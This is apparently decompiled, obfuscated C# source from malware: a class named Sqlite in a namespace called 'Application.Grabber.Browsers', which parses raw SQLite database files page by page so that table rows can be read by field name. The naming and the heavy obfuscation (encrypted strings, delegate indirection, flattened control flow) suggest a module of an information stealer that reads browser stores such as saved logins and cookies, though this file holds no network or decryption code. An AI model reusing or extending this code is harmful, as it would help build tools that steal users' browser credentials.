using System;
using System.Runtime.CompilerServices;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Application.Grabber.Browsers
{
	// Token: 0x02000033 RID: 51
	public class Sqlite
	{
		// Token: 0x060001D0 RID: 464 RVA: 0x0000B5A0 File Offset: 0x000097A0
		[MethodImpl(MethodImplOptions.NoInlining)]
		public Sqlite(string baseName)
		{
			if (delegate0d2.f0000bf(baseName))
			{
				delegate0110.f00013f(1, baseName, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared, -1);
				string p = delegate0112.f000141((int)delegate0111.f000140(1));
				delegate0113.f000142(1, ref p, -1L, false);
				delegate0114.f000143(new int[]
				{
					1
				});
				this.db_bytes = delegate0d7.f0000d1(delegate0d6.f0000cc(), p);
				if (delegate0115.f000144(delegate0d6.f0000cc(), this.db_bytes, 0, 15).CompareTo(c0000c0.m00000f("ÂP\u0001\rÒ\f\u0013QÃ\0#M|·~")) != 0)
				{
					throw new Exception(c0000c0.m00000f("ßn9DÇIEVÀ\u001b*\f[Æ\u0001\u000eâçNU\r\u0080{Ù2Ü\u0016­r\u0098¥ßqR"));
				}
				if (this.db_bytes[52] != 0)
				{
					throw new Exception(c0000c0.m00000f("Ðt9\v\u008b\u001fRTÙ\a#\fkö=\u0006ôî\vFI¥nÌ1ß\u0004»7Ñ\u0090\u0096sX>LëøP\u0080Q\u001f¼ðÿ"));
				}
				this.page_size = (ushort)this.ConvertToInteger(16, 2);
				this.encoding = this.ConvertToInteger(56, 4);
				if (delegate0116.f000146(new decimal(this.encoding), 0m) == 0)
				{
					this.encoding = 1UL;
				}
				this.ReadMasterTable(100UL);
			}
		}

		// Token: 0x060001D1 RID: 465 RVA: 0x0000B6E8 File Offset: 0x000098E8
		[MethodImpl(MethodImplOptions.NoInlining)]
		private ulong ConvertToInteger(int startIndex, int Size)
		{
			ulong num2;
			int num3;
			for (;;)
			{
				int num = delegate0da.f0000d7(-3);
				for (;;)
				{
					switch (num)
					{
					case 0:
						goto IL_05;
					case 1:
						goto IL_68;
					case 2:
						goto IL_50;
					case 3:
						if (Size > 8 | Size == 0)
						{
							goto Block_1;
						}
						goto IL_05;
					}
					break;
					IL_05:
					num2 = 0UL;
					num3 = Size - 1;
					num = delegate0da.f0000d7(-2);
				}
			}
			IL_50:
			int num4 = 0;
			goto IL_7C;
			Block_1:
			return 0UL;
			IL_68:
			num2 = (num2 << 8 | (ulong)this.db_bytes[startIndex + num4]);
			num4++;
			IL_7C:
			if (num4 > num3)
			{
				return num2;
			}
			goto IL_68;
		}

		// Token: 0x060001D2 RID: 466 RVA: 0x0000B77C File Offset: 0x0000997C
		[MethodImpl(MethodImplOptions.NoInlining)]
		private long CVL(int startIndex, int endIndex)
		{
			byte[] array;
			for (;;)
			{
				int num = delegate0da.f0000d7(-3);
				for (;;)
				{
					int num2;
					bool flag;
					int num5;
					switch (num)
					{
					case 0:
						goto IL_FD;
					case 1:
					{
						num2++;
						int num3;
						num3--;
						goto IL_153;
					}
					case 2:
						endIndex--;
						num2 = 1;
						goto IL_3E;
					case 3:
					{
						endIndex++;
						array = new byte[8];
						int num4 = endIndex - startIndex;
						flag = false;
						if (num4 == 0 | num4 > 9)
						{
							goto Block_2;
						}
						if (num4 == 1)
						{
							array[0] = (this.db_bytes[startIndex] & 127);
							num = delegate0da.f0000d7(0);
							continue;
						}
						if (num4 == 9)
						{
							flag = true;
						}
						num5 = 1;
						int num3 = 7;
						goto IL_3E;
					}
					}
					break;
					IL_159:
					int num6;
					if (num6 < startIndex)
					{
						goto Block_6;
					}
					if (num6 - 1 >= startIndex)
					{
						int num3;
						array[num2] = (byte)(((int)((byte)(this.db_bytes[num6] >> (num5 - 1 & 7))) & 255 >> num5) | (int)((byte)(this.db_bytes[num6 - 1] << (num3 & 7))));
						num5++;
						num = delegate0da.f0000d7(-1);
						continue;
					}
					if (!flag)
					{
						array[num2] = (byte)((int)((byte)(this.db_bytes[num6] >> (num5 - 1 & 7))) & 255 >> num5);
						goto IL_153;
					}
					goto IL_153;
					IL_3E:
					num6 = endIndex - 1;
					goto IL_159;
					IL_153:
					num6 += -1;
					goto IL_159;
				}
			}
			Block_2:
			return 0L;
			IL_FD:
			return BitConverter.ToInt64(array, 0);
			Block_6:
			return delegate0117.f000147(array, 0);
		}

		// Token: 0x060001D3 RID: 467 RVA: 0x0000B8F8 File Offset: 0x00009AF8
		[MethodImpl(MethodImplOptions.NoInlining)]
		public int GetRowCount()
		{
			return this.table_entries.Length;
		}

		// Token: 0x060001D4 RID: 468 RVA: 0x0000B910 File Offset: 0x00009B10
		[MethodImpl(MethodImplOptions.NoInlining)]
		public string GetValue(int row_num, int field)
		{
			for (;;)
			{
				int num = delegate0da.f0000d7(-3);
				for (;;)
				{
					switch (num)
					{
					case 0:
						goto IL_91;
					case 1:
						goto IL_93;
					case 2:
						goto IL_36;
					case 3:
						if (row_num >= this.table_entries.Length)
						{
							num = delegate0da.f0000d7(0);
							continue;
						}
						goto IL_36;
					}
					break;
					IL_36:
					if (field < this.table_entries[row_num].content.Length)
					{
						goto IL_95;
					}
					num = delegate0da.f0000d7(-1);
				}
			}
			IL_91:
			return null;
			IL_93:
			return null;
			IL_95:
			return this.table_entries[row_num].content[field];
		}

		// Token: 0x060001D5 RID: 469 RVA: 0x0000B9C8 File Offset: 0x00009BC8
		[MethodImpl(MethodImplOptions.NoInlining)]
		public string GetValue(int row_num, string field)
		{
			int num3;
			for (;;)
			{
				int num = delegate0da.f0000d7(-3);
				for (;;)
				{
					IL_05:
					switch (num)
					{
					case 0:
					{
						int i;
						int num2;
						while (i <= num2)
						{
							if (this.field_names[i].ToLower().CompareTo(field.ToLower()) == 0)
							{
								num3 = i;
								num = delegate0da.f0000d7(-2);
								goto IL_05;
							}
							i++;
						}
						num = delegate0da.f0000d7(-1);
						continue;
					}
					case 1:
						goto IL_37;
					case 2:
						goto IL_36;
					case 3:
					{
						num3 = -1;
						int num2 = this.field_names.Length - 1;
						int i = 0;
						num = delegate0da.f0000d7(0);
						continue;
					}
					}
					break;
				}
			}
			IL_36:
			IL_37:
			if (num3 == -1)
			{
				return null;
			}
			return this.GetValue(row_num, num3);
		}

		// Token: 0x060001D6 RID: 470 RVA: 0x0000BAA4 File Offset: 0x00009CA4
		[MethodImpl(MethodImplOptions.NoInlining)]
		private int GVL(int startIndex)
		{
			for (;;)
			{
				int num = delegate0da.f0000d7(-3);
				for (;;)
				{
					int num2;
					int num3;
					switch (num)
					{
					case 0:
						num2 = startIndex;
						goto IL_B3;
					case 1:
						IL_AF:
						num2++;
						goto IL_B3;
					case 2:
						return 0;
					case 3:
						if (startIndex > this.db_bytes.Length)
						{
							return 0;
						}
						num3 = startIndex + 8;
						num = delegate0da.f0000d7(0);
						continue;
					}
					break;
					IL_B3:
					if (num2 > num3)
					{
						goto Block_4;
					}
					if (num2 > this.db_bytes.Length - 1)
					{
						num = delegate0da.f0000d7(-2);
					}
					else
					{
						if ((this.db_bytes[num2] & 128) != 128)
						{
							return num2;
						}
						goto IL_AF;
					}
				}
			}
			return 0;
			Block_4:
			return startIndex + 8;
		}

		// Token: 0x060001D7 RID: 471 RVA: 0x0000BB70 File Offset: 0x00009D70
		[MethodImpl(MethodImplOptions.NoInlining)]
		private bool IsOdd(long value)
		{
			return (value & 1L) == 1L;
		}

		// Token: 0x060001D8 RID: 472 RVA: 0x0000BB88 File Offset: 0x00009D88
		[MethodImpl(MethodImplOptions.NoInlining)]
		private void ReadMasterTable(ulong Offset)
		{
			for (;;)
			{
				int num = delegate0da.f0000d7(-3);
				for (;;)
				{
					ulong num3;
					int num2;
					int num4;
					long value;
					long[] array;
					int num6;
					int num7;
					int num9;
					switch (num)
					{
					case 0:
					{
						num2 = this.GVL((int)num3);
						num4 = num2;
						value = this.CVL((int)num3, num2);
						array = new long[5];
						int num5 = 0;
						do
						{
							num2 = num4 + 1;
							num4 = this.GVL(num2);
							array[num5] = this.CVL(num2, num4);
							if (array[num5] > 9L)
							{
								if (this.IsOdd(array[num5]))
								{
									array[num5] = (long)delegate011d.f000150((double)(array[num5] - 13L) / 2.0);
								}
								else
								{
									array[num5] = (long)delegate011d.f000150((double)(array[num5] - 12L) / 2.0);
								}
							}
							else
							{
								array[num5] = (long)((ulong)this.SQLDataTypeSize[(int)array[num5]]);
							}
							num5++;
						}
						while (num5 <= 4);
						if (delegate0116.f000146(new decimal(this.encoding), 1m) == 0)
						{
							this.master_table_entries[num6 + num7].item_type = delegate0115.f000144(delegate0d6.f0000cc(), this.db_bytes, delegate0119.f00014c(delegate0118.f000149(new decimal(num3), new decimal(value))), (int)array[0]);
							num = delegate0da.f0000d7(-2);
							continue;
						}
						if (decimal.Compare(new decimal(this.encoding), 2m) == 0)
						{
							this.master_table_entries[num6 + num7].item_type = delegate0115.f000144(delegate0d6.f0000ca(), this.db_bytes, delegate0119.f00014c(delegate0118.f000149(new decimal(num3), new decimal(value))), (int)array[0]);
							goto IL_11E;
						}
						if (decimal.Compare(new decimal(this.encoding), 3m) == 0)
						{
							this.master_table_entries[num6 + num7].item_type = delegate0115.f000144(delegate0d6.f0000cd(), this.db_bytes, delegate0119.f00014c(delegate0118.f000149(new decimal(num3), new decimal(value))), (int)array[0]);
							goto IL_11E;
						}
						goto IL_11E;
					}
					case 1:
						this.master_table_entries[num6 + num7].sql_statement = delegate0115.f000144(delegate0d6.f0000ca(), this.db_bytes, delegate0119.f00014c(delegate0118.f000149(delegate0118.f000149(delegate0118.f000149(delegate0118.f000149(delegate0118.f000149(new decimal(num3), new decimal(value)), new decimal(array[0])), new decimal(array[1])), new decimal(array[2])), new decimal(array[3]))), (int)array[4]);
						goto IL_90B;
					case 2:
						goto IL_11E;
					case 3:
						if (this.db_bytes[(int)Offset] == 13)
						{
							ushort num8 = delegate011a.f00014d(delegate0118.f00014a(new decimal(this.ConvertToInteger(delegate0119.f00014c(delegate0118.f000149(new decimal(Offset), 3m)), 2)), 1m));
							num6 = 0;
							if (this.master_table_entries != null)
							{
								num6 = this.master_table_entries.Length;
								this.master_table_entries = (Sqlite.sqlite_master_entry[])delegate011b.f00014e(this.master_table_entries, new Sqlite.sqlite_master_entry[this.master_table_entries.Length + (int)num8 + 1]);
							}
							else
							{
								this.master_table_entries = new Sqlite.sqlite_master_entry[(int)(num8 + 1)];
							}
							num9 = (int)num8;
							num7 = 0;
							goto IL_90F;
						}
						goto IL_917;
					}
					break;
					IL_11E:
					if (decimal.Compare(new decimal(this.encoding), 1m) == 0)
					{
						this.master_table_entries[num6 + num7].item_name = delegate0115.f000144(delegate0d6.f0000cc(), this.db_bytes, delegate0119.f00014c(delegate0118.f000149(delegate0118.f000149(new decimal(num3), new decimal(value)), new decimal(array[0]))), (int)array[1]);
					}
					else if (decimal.Compare(new decimal(this.encoding), 2m) == 0)
					{
						this.master_table_entries[num6 + num7].item_name = delegate0115.f000144(delegate0d6.f0000ca(), this.db_bytes, delegate0119.f00014c(delegate0118.f000149(delegate0118.f000149(new decimal(num3), new decimal(value)), new decimal(array[0]))), (int)array[1]);
					}
					else if (decimal.Compare(new decimal(this.encoding), 3m) == 0)
					{
						this.master_table_entries[num6 + num7].item_name = delegate0115.f000144(delegate0d6.f0000cd(), this.db_bytes, delegate0119.f00014c(delegate0118.f000149(delegate0118.f000149(new decimal(num3), new decimal(value)), new decimal(array[0]))), (int)array[1]);
					}
					this.master_table_entries[num6 + num7].root_num = (long)this.ConvertToInteger(delegate0119.f00014c(delegate0118.f000149(delegate0118.f000149(delegate0118.f000149(delegate0118.f000149(new decimal(num3), new decimal(value)), new decimal(array[0])), new decimal(array[1])), new decimal(array[2]))), (int)array[3]);
					if (delegate0116.f000146(new decimal(this.encoding), 1m) == 0)
					{
						this.master_table_entries[num6 + num7].sql_statement = delegate0115.f000144(delegate0d6.f0000cc(), this.db_bytes, delegate0119.f00014c(delegate0118.f000149(delegate0118.f000149(delegate0118.f000149(delegate0118.f000149(delegate0118.f000149(new decimal(num3), new decimal(value)), new decimal(array[0])), new decimal(array[1])), new decimal(array[2])), new decimal(array[3]))), (int)array[4]);
						goto IL_90B;
					}
					if (decimal.Compare(new decimal(this.encoding), 2m) == 0)
					{
						num = delegate0da.f0000d7(-1);
						continue;
					}
					if (decimal.Compare(new decimal(this.encoding), 3m) == 0)
					{
						this.master_table_entries[num6 + num7].sql_statement = delegate0115.f000144(delegate0d6.f0000cd(), this.db_bytes, delegate0119.f00014c(delegate0118.f000149(delegate0118.f000149(delegate0118.f000149(delegate0118.f000149(delegate0118.f000149(new decimal(num3), new decimal(value)), new decimal(array[0])), new decimal(array[1])), new decimal(array[2])), new decimal(array[3]))), (int)array[4]);
						goto IL_90B;
					}
					goto IL_90B;
					IL_90F:
					if (num7 > num9)
					{
						return;
					}
					num3 = this.ConvertToInteger(delegate0119.f00014c(delegate0118.f000149(delegate0118.f000149(new decimal(Offset), 8m), new decimal(num7 * 2))), 2);
					if (delegate0116.f000146(new decimal(Offset), 100m) != 0)
					{
						num3 += Offset;
					}
					num2 = this.GVL((int)num3);
					this.CVL((int)num3, num2);
					num4 = this.GVL(delegate0119.f00014c(delegate0118.f000149(delegate0118.f000149(new decimal(num3), delegate0118.f00014a(new decimal(num2), new decimal(num3))), 1m)));
					this.master_table_entries[num6 + num7].row_id = this.CVL(delegate0119.f00014c(delegate0118.f000149(delegate0118.f000149(new decimal(num3), delegate0118.f00014a(new decimal(num2), new decimal(num3))), 1m)), num4);
					num3 = delegate011c.f00014f(delegate0118.f000149(delegate0118.f000149(new decimal(num3), delegate0118.f00014a(new decimal(num4), new decimal(num3))), 1m));
					num = delegate0da.f0000d7(0);
					continue;
					IL_90B:
					num7++;
					goto IL_90F;
				}
			}
			return;
			IL_917:
			if (this.db_bytes[(int)Offset] == 5)
			{
				int num10 = (int)delegate011a.f00014d(delegate0118.f00014a(new decimal(this.ConvertToInteger(delegate0119.f00014c(delegate0118.f000149(new decimal(Offset), 3m)), 2)), 1m));
				for (int i = 0; i <= num10; i++)
				{
					ushort num11 = (ushort)this.ConvertToInteger(delegate0119.f00014c(delegate0118.f000149(delegate0118.f000149(new decimal(Offset), 12m), new decimal(i * 2))), 2);
					if (delegate0116.f000146(new decimal(Offset), 100m) == 0)
					{
						this.ReadMasterTable(delegate011c.f00014f(delegate0118.f00014b(delegate0118.f00014a(new decimal(this.ConvertToInteger((int)num11, 4)), 1m), new decimal((int)this.page_size))));
					}
					else
					{
						this.ReadMasterTable(delegate011c.f00014f(delegate0118.f00014b(delegate0118.f00014a(new decimal(this.ConvertToInteger((int)(Offset + (ulong)num11), 4)), 1m), new decimal((int)this.page_size))));
					}
				}
				this.ReadMasterTable(delegate011c.f00014f(delegate0118.f00014b(delegate0118.f00014a(new decimal(this.ConvertToInteger(delegate0119.f00014c(delegate0118.f000149(new decimal(Offset), 8m)), 4)), 1m), new decimal((int)this.page_size))));
			}
		}

		// Token: 0x060001D9 RID: 473 RVA: 0x0000C660 File Offset: 0x0000A860
		[MethodImpl(MethodImplOptions.NoInlining)]
		public bool ReadTable(string TableName)
		{
			int num5;
			for (;;)
			{
				int num = delegate0da.f0000d7(-3);
				for (;;)
				{
					IL_05:
					string[] array;
					int num2;
					int num3;
					int num4;
					switch (num)
					{
					case 0:
						goto IL_100;
					case 1:
						array[num2] = delegate0120.f000154(array[num2], 0, num3);
						goto IL_17F;
					case 2:
						num4 = array.Length - 1;
						num2 = 0;
						goto IL_1CE;
					case 3:
					{
						num5 = -1;
						int num6 = this.master_table_entries.Length - 1;
						for (int i = 0; i <= num6; i++)
						{
							if (this.master_table_entries[i].item_name.ToLower().CompareTo(TableName.ToLower()) == 0)
							{
								num5 = i;
								num = delegate0da.f0000d7(0);
								goto IL_05;
							}
						}
						goto IL_100;
					}
					}
					break;
					IL_1CE:
					if (num2 > num4)
					{
						goto IL_1D6;
					}
					array[num2] = delegate011e.f000151(array[num2], new char[0]);
					num3 = delegate011f.f000152(array[num2], c0000c0.m00000f("±"));
					if (num3 > 0)
					{
						num = delegate0da.f0000d7(-1);
						continue;
					}
					goto IL_17F;
					IL_100:
					if (num5 == -1)
					{
						return false;
					}
					array = this.master_table_entries[num5].sql_statement.Substring(this.master_table_entries[num5].sql_statement.IndexOf(c0000c0.m00000f("¹")) + 1).Split(new char[]
					{
						','
					});
					num = delegate0da.f0000d7(-2);
					continue;
					IL_17F:
					if (array[num2].IndexOf(c0000c0.m00000f("ÄO\u00045ó,")) != 0)
					{
						this.field_names = (string[])delegate011b.f00014e(this.field_names, new string[num2 + 1]);
						this.field_names[num2] = array[num2];
						num2++;
						goto IL_1CE;
					}
					goto IL_1D6;
				}
			}
			return false;
			IL_1D6:
			return this.ReadTableFromOffset((ulong)((this.master_table_entries[num5].root_num - 1L) * (long)((ulong)this.page_size)));
		}

		// Token: 0x060001DA RID: 474 RVA: 0x0000C868 File Offset: 0x0000AA68
		[MethodImpl(MethodImplOptions.NoInlining)]
		private bool ReadTableFromOffset(ulong Offset)
		{
			for (;;)
			{
				int num = delegate0da.f0000d7(-3);
				for (;;)
				{
					int num2;
					int num3;
					ulong num4;
					int num5;
					int num6;
					long num7;
					long num8;
					int num9;
					int num10;
					int num11;
					Sqlite.record_header_field[] array;
					int num13;
					switch (num)
					{
					case 0:
						this.table_entries[num2 + num3].row_id = this.CVL(delegate0119.f00014c(delegate0118.f000149(delegate0118.f000149(new decimal(num4), delegate0118.f00014a(new decimal(num5), new decimal(num4))), 1m)), num6);
						num4 = delegate011c.f00014f(delegate0118.f000149(delegate0118.f000149(new decimal(num4), delegate0118.f00014a(new decimal(num6), new decimal(num4))), 1m));
						num5 = this.GVL((int)num4);
						num6 = num5;
						num7 = this.CVL((int)num4, num5);
						num8 = delegate0121.f000155(delegate0118.f000149(delegate0118.f00014a(new decimal(num4), new decimal(num5)), 1m));
						num9 = 0;
						goto IL_6F;
					case 1:
						this.table_entries[num2 + num3].content[num10] = delegate0115.f000144(delegate0d6.f0000cd(), this.db_bytes, delegate0119.f00014c(delegate0118.f000149(delegate0118.f000149(new decimal(num4), new decimal(num7)), new decimal(num11))), (int)array[num10].size);
						goto IL_6F8;
					case 2:
						IL_36:
						array[num9].size = (long)((ulong)this.SQLDataTypeSize[(int)array[num9].type]);
						goto IL_5B;
					case 3:
						if (this.db_bytes[(int)Offset] == 13)
						{
							int num12 = delegate0119.f00014c(delegate0118.f00014a(new decimal(this.ConvertToInteger(delegate0119.f00014c(delegate0118.f000149(new decimal(Offset), 3m)), 2)), 1m));
							num2 = 0;
							if (this.table_entries != null)
							{
								num2 = this.table_entries.Length;
								this.table_entries = (Sqlite.table_entry[])delegate011b.f00014e(this.table_entries, new Sqlite.table_entry[this.table_entries.Length + num12 + 1]);
							}
							else
							{
								this.table_entries = new Sqlite.table_entry[num12 + 1];
							}
							num13 = num12;
							num3 = 0;
							goto IL_71F;
						}
						goto IL_72B;
					}
					break;
					IL_712:
					int num14;
					if (num10 > num14)
					{
						num3++;
						goto IL_71F;
					}
					if (array[num10].type <= 9L)
					{
						this.table_entries[num2 + num3].content[num10] = delegate0122.f000156(this.ConvertToInteger(delegate0119.f00014c(delegate0118.f000149(delegate0118.f000149(new decimal(num4), new decimal(num7)), new decimal(num11))), (int)array[num10].size));
						goto IL_6F8;
					}
					if (this.IsOdd(array[num10].type))
					{
						this.table_entries[num2 + num3].content[num10] = delegate0115.f000144(delegate0d6.f0000cc(), this.db_bytes, delegate0119.f00014c(delegate0118.f000149(delegate0118.f000149(new decimal(num4), new decimal(num7)), new decimal(num11))), (int)array[num10].size);
						goto IL_6F8;
					}
					if (delegate0116.f000146(new decimal(this.encoding), 1m) == 0)
					{
						this.table_entries[num2 + num3].content[num10] = delegate0115.f000144(delegate0d6.f0000cc(), this.db_bytes, delegate0119.f00014c(delegate0118.f000149(delegate0118.f000149(new decimal(num4), new decimal(num7)), new decimal(num11))), (int)array[num10].size);
						goto IL_6F8;
					}
					if (decimal.Compare(new decimal(this.encoding), 2m) == 0)
					{
						this.table_entries[num2 + num3].content[num10] = delegate0115.f000144(delegate0d6.f0000ca(), this.db_bytes, delegate0119.f00014c(delegate0118.f000149(delegate0118.f000149(new decimal(num4), new decimal(num7)), new decimal(num11))), (int)array[num10].size);
						goto IL_6F8;
					}
					if (decimal.Compare(new decimal(this.encoding), 3m) == 0)
					{
						num = delegate0da.f0000d7(-1);
						continue;
					}
					goto IL_6F8;
					IL_6F:
					if (num8 >= num7)
					{
						this.table_entries[num2 + num3].content = new string[array.Length - 1 + 1];
						num11 = 0;
						num14 = array.Length - 1;
						num10 = 0;
						goto IL_712;
					}
					array = (Sqlite.record_header_field[])Utils.CopyArray(array, new Sqlite.record_header_field[num9 + 1]);
					num5 = num6 + 1;
					num6 = this.GVL(num5);
					array[num9].type = this.CVL(num5, num6);
					if (array[num9].type <= 9L)
					{
						goto IL_36;
					}
					if (this.IsOdd(array[num9].type))
					{
						array[num9].size = (long)delegate011d.f000150((double)(array[num9].type - 13L) / 2.0);
					}
					else
					{
						array[num9].size = (long)delegate011d.f000150((double)(array[num9].type - 12L) / 2.0);
					}
					IL_5B:
					num8 = num8 + (long)(num6 - num5) + 1L;
					num9++;
					goto IL_6F;
					IL_71F:
					if (num3 > num13)
					{
						goto Block_13;
					}
					array = null;
					num4 = this.ConvertToInteger(delegate0119.f00014c(delegate0118.f000149(delegate0118.f000149(new decimal(Offset), 8m), new decimal(num3 * 2))), 2);
					if (delegate0116.f000146(new decimal(Offset), 100m) != 0)
					{
						num4 += Offset;
					}
					num5 = this.GVL((int)num4);
					this.CVL((int)num4, num5);
					num6 = this.GVL(delegate0119.f00014c(delegate0118.f000149(delegate0118.f000149(new decimal(num4), delegate0118.f00014a(new decimal(num5), new decimal(num4))), 1m)));
					num = delegate0da.f0000d7(0);
					continue;
					IL_6F8:
					num11 += (int)array[num10].size;
					num10++;
					goto IL_712;
				}
			}
			Block_13:
			return true;
			IL_72B:
			if (this.db_bytes[(int)Offset] == 5)
			{
				int num15 = (int)delegate011a.f00014d(delegate0118.f00014a(new decimal(this.ConvertToInteger(delegate0119.f00014c(delegate0118.f000149(new decimal(Offset), 3m)), 2)), 1m));
				for (int i = 0; i <= num15; i++)
				{
					ushort num16 = (ushort)this.ConvertToInteger(delegate0119.f00014c(delegate0118.f000149(delegate0118.f000149(new decimal(Offset), 12m), new decimal(i * 2))), 2);
					this.ReadTableFromOffset(delegate011c.f00014f(delegate0118.f00014b(delegate0118.f00014a(new decimal(this.ConvertToInteger((int)(Offset + (ulong)num16), 4)), 1m), new decimal((int)this.page_size))));
				}
				this.ReadTableFromOffset(delegate011c.f00014f(delegate0118.f00014b(delegate0118.f00014a(new decimal(this.ConvertToInteger(delegate0119.f00014c(delegate0118.f000149(new decimal(Offset), 8m)), 4)), 1m), new decimal((int)this.page_size))));
			}
			return true;
		}

		// Token: 0x060001DB RID: 475 RVA: 0x0000D0F4 File Offset: 0x0000B2F4
		// Note: this type is marked as 'beforefieldinit'.
		[MethodImpl(MethodImplOptions.NoInlining)]
		static Sqlite()
		{
			c0000c0.Initialize();
			c0000c0.PostInitialize();
		}

		// Token: 0x04000087 RID: 135
		private byte[] db_bytes;

		// Token: 0x04000088 RID: 136
		private ulong encoding;

		// Token: 0x04000089 RID: 137
		private string[] field_names;

		// Token: 0x0400008A RID: 138
		private Sqlite.sqlite_master_entry[] master_table_entries;

		// Token: 0x0400008B RID: 139
		private ushort page_size;

		// Token: 0x0400008C RID: 140
		private byte[] SQLDataTypeSize = new byte[]
		{
			0,
			1,
			2,
			3,
			4,
			6,
			8,
			8,
			0,
			0
		};

		// Token: 0x0400008D RID: 141
		private Sqlite.table_entry[] table_entries;

		// Token: 0x02000034 RID: 52
		private struct record_header_field
		{
			// Token: 0x060001DC RID: 476 RVA: 0x0000D100 File Offset: 0x0000B300
			// Note: this type is marked as 'beforefieldinit'.
			[MethodImpl(MethodImplOptions.NoInlining)]
			static record_header_field()
			{
				c0000c0.Initialize();
				c0000c0.PostInitialize();
			}

			// Token: 0x0400008E RID: 142
			public long size;

			// Token: 0x0400008F RID: 143
			public long type;
		}

		// Token: 0x02000035 RID: 53
		private struct sqlite_master_entry
		{
			// Token: 0x060001DD RID: 477 RVA: 0x0000D10C File Offset: 0x0000B30C
			// Note: this type is marked as 'beforefieldinit'.
			[MethodImpl(MethodImplOptions.NoInlining)]
			static sqlite_master_entry()
			{
				c0000c0.Initialize();
				c0000c0.PostInitialize();
			}

			// Token: 0x04000090 RID: 144
			public long row_id;

			// Token: 0x04000091 RID: 145
			public string item_type;

			// Token: 0x04000092 RID: 146
			public string item_name;

			// Token: 0x04000093 RID: 147
			public string astable_name;

			// Token: 0x04000094 RID: 148
			public long root_num;

			// Token: 0x04000095 RID: 149
			public string sql_statement;
		}

		// Token: 0x02000036 RID: 54
		private struct table_entry
		{
			// Token: 0x060001DE RID: 478 RVA: 0x0000D118 File Offset: 0x0000B318
			// Note: this type is marked as 'beforefieldinit'.
			[MethodImpl(MethodImplOptions.NoInlining)]
			static table_entry()
			{
				c0000c0.Initialize();
				c0000c0.PostInitialize();
			}

			// Token: 0x04000096 RID: 150
			public long row_id;

			// Token: 0x04000097 RID: 151
			public string[] content;
		}
	}
}
